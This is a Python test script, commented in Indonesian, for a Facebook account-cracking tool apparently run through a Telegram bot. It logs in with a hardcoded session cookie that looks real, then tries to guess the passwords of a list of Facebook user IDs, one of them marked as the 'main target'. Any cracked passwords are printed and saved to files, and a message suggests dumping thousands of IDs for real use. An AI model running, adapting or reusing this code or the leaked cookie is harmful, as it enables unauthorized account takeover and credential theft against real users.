#!/usr/bin/env python3
"""
Script Testing Bot Telegram - Quick Test (Limit 20 ID)
"""

import os
import sys
import time

# Set environment agar tidak ada prompt
os.environ['PYTHONUNBUFFERED'] = '1'

# Masuk ke direktori Premium-2-1t dan tambahkan ke path
current_dir = os.path.dirname(os.path.abspath(__file__))
premium_dir = os.path.join(current_dir, 'Premium-2-1t')
sys.path.insert(0, premium_dir)

# Ubah working directory ke Premium-2-1t
os.chdir(premium_dir)

from core.auth import FacebookAuth
from core.cracker import FacebookCracker
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table

console = Console()

def print_header(title):
    """Print header dengan border"""
    console.print(Panel(f"[bold cyan]{title}[/bold cyan]", border_style="cyan"))

def test_login(cookie):
    """Test login dengan cookie"""
    print_header("🔐 TEST LOGIN FACEBOOK")
    
    auth = FacebookAuth()
    success, message, token = auth.save_cookie(cookie)
    
    if success:
        console.print(f"[green]✅ {message}[/green]")
        return auth, token
    else:
        console.print(f"[red]❌ {message}[/red]")
        return None, None

def test_crack_direct(auth, target_ids, method="mobile"):
    """Test crack langsung beberapa ID"""
    print_header(f"💥 TEST CRACK FACEBOOK (Method: {method})")
    
    console.print(f"[yellow]Akan crack {len(target_ids)} ID untuk demo[/yellow]\n")
    
    cracker = FacebookCracker(max_workers=5)
    results_ok = []
    results_cp = []
    results_failed = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        task = progress.add_task("Cracking...", total=len(target_ids))
        
        for idx, id_info in enumerate(target_ids, 1):
            user_id = id_info['id']
            name = id_info['name']
            
            progress.update(task, description=f"Crack {idx}/{len(target_ids)}: {name[:30]}")
            
            # Crack single ID
            result = cracker.crack_single(user_id, name, method=method)
            
            if result:
                if result['status'] == 'OK':
                    results_ok.append(result)
                    console.print(f"[green]✅ OK: {name} | Pass: {result['password']}[/green]")
                elif result['status'] == 'CP':
                    results_cp.append(result)
                    console.print(f"[yellow]⚠️  CP: {name} | Pass: {result['password']}[/yellow]")
            else:
                results_failed.append({'id': user_id, 'name': name})
                console.print(f"[red]❌ FAILED: {name}[/red]")
            
            progress.advance(task)
            time.sleep(0.3)  # Delay antar request
    
    # Tampilkan summary dalam tabel
    console.print("\n")
    print_header("📊 HASIL CRACK - SUMMARY")
    
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Status", style="cyan", width=10)
    table.add_column("Jumlah", style="yellow", width=10)
    table.add_column("Persentase", style="green", width=15)
    
    total = len(target_ids)
    table.add_row("✅ OK", str(len(results_ok)), f"{(len(results_ok)/total*100):.1f}%")
    table.add_row("⚠️  CP", str(len(results_cp)), f"{(len(results_cp)/total*100):.1f}%")
    table.add_row("❌ FAILED", str(len(results_failed)), f"{(len(results_failed)/total*100):.1f}%")
    
    console.print(table)
    
    # Simpan hasil ke file
    if results_ok:
        save_results("OK", results_ok)
    if results_cp:
        save_results("CP", results_cp)
    
    # Tampilkan detail hasil
    if results_ok:
        console.print("\n[bold green]DETAIL HASIL OK:[/bold green]")
        for r in results_ok:
            console.print(f"  • {r['name']}")
            console.print(f"    ID: {r['id']} | Password: {r['password']}")
    
    if results_cp:
        console.print("\n[bold yellow]DETAIL HASIL CP:[/bold yellow]")
        for r in results_cp:
            console.print(f"  • {r['name']}")
            console.print(f"    ID: {r['id']} | Password: {r['password']}")
    
    return results_ok, results_cp

def save_results(status, results):
    """Simpan hasil crack ke file"""
    folder = status
    os.makedirs(folder, exist_ok=True)
    
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{folder}/hasil_test_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        f.write(f"=== HASIL {status} - TEST BOT TELEGRAM ===\n")
        f.write(f"Tanggal: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {len(results)}\n")
        f.write("="*50 + "\n\n")
        for result in results:
            f.write(f"{result['id']}|{result['password']}|{result['name']}\n")
    
    console.print(f"[cyan]💾 Hasil {status} disimpan ke: {filename}[/cyan]")

def main():
    """Fungsi utama testing"""
    console.print("\n")
    print_header("🤖 BOT TELEGRAM FACEBOOK CRACK - QUICK TEST")
    console.print("\n")
    
    # Data test dari user
    COOKIE = "dbln=%7B%22100023449360931%22%3A%22VG56uyjD%22%2C%2261583843228443%22%3A%22fPOY5Jyk%22%7D; sb=-1sdadTuYQAS1RJL4Zr-RkZs; ps_l=1; ps_n=1; dpr=2.673030376434326; locale=id_ID; datr=jk0eaSuT60mOUzhTIRrh6TMC; pas=61583843228443%3APpfCvpKTmQ; vpd=v1%3B1002x502x2.4312500953674316; wl_cbv=v2%3Bclient_version%3A2991%3Btimestamp%3A1763787674; c_user=100023449360931; wd=891x1779; fr=148lFZ1YeD6icu7vP.AWf6UIDJeUHVPmlGHayoNXgjZ5orSFvsMynTHzJ7EzRoICFpSdM.BpIe-m..AAA.0.0.BpIe-m.AWdOwaUI4GkW03Q2BmRtZYWVLnY; xs=35%3AM7eLT4CupP467g%3A2%3A1763788618%3A-1%3A-1%3A%3AAczigOtkcilAAETw1TjjhLoVwEXukCFBHmtFOPbftQ; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1763834476847%2C%22v%22%3A1%7D"
    
    # ID sampel untuk test (beberapa ID populer)
    # Kita akan crack beberapa ID ini untuk demo
    TEST_IDS = [
        {'id': '100028074584110', 'name': 'Target Utama'},
        {'id': '100000123456789', 'name': 'Sample User 1'},
        {'id': '100000234567890', 'name': 'Sample User 2'},
        {'id': '100000345678901', 'name': 'Sample User 3'},
        {'id': '100000456789012', 'name': 'Sample User 4'},
        {'id': '100000567890123', 'name': 'Sample User 5'},
        {'id': '100000678901234', 'name': 'Sample User 6'},
        {'id': '100000789012345', 'name': 'Sample User 7'},
        {'id': '100000890123456', 'name': 'Sample User 8'},
        {'id': '100000901234567', 'name': 'Sample User 9'},
    ]
    
    try:
        # Step 1: Test Login
        auth, token = test_login(COOKIE)
        if not auth:
            console.print("[red]❌ Login gagal! Test dihentikan.[/red]")
            return
        
        console.print("\n")
        time.sleep(1)
        
        # Step 2: Test Crack langsung
        console.print("[cyan]ℹ️  Mode Quick Test: Akan crack 10 ID sampel untuk demo[/cyan]")
        console.print("[cyan]   (Dalam penggunaan nyata, Anda bisa dump ribuan ID terlebih dahulu)[/cyan]\n")
        time.sleep(2)
        
        results_ok, results_cp = test_crack_direct(auth, TEST_IDS, method="mobile")
        
        console.print("\n")
        print_header("✅ TEST SELESAI")
        console.print("[green]Semua fitur bot telah diuji![/green]")
        
        if results_ok or results_cp:
            console.print("\n[cyan]💡 Hasil telah disimpan ke folder OK/ dan CP/[/cyan]")
            console.print("[cyan]   Anda bisa menggunakan bot Telegram untuk test dengan data sesungguhnya[/cyan]")
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Test dibatalkan oleh user[/yellow]")
    except Exception as e:
        console.print(f"\n[red]❌ Error: {str(e)}[/red]")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
